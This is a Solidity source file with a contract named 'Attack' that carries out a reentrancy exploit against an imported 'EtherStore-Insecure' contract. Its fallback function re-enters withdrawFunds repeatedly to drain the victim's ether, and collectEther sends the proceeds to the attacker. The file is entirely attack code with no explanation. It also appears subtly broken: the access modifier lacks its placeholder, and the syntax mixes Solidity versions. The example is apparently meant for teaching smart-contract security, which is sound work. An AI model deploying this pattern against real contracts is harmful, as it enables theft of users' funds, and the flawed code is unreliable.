import "EtherStore-Insecure.sol";

contract Attack {

    EtherStore public etherStore;
    address public attacker;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        attacker = msg.sender;
    }

    modifier onlyAttacker {
        require(msg.sender == attacker);
    }

    function attackEtherStore() public payable onlyAttacker {

        require(msg.value >= 1 ether);

        etherStore.depositFunds.value(1 ether)();

        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public onlyAttacker {
        msg.sender.transfer(this.balance);
    }

    function () payable {
        
        if (etherStore.balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

}
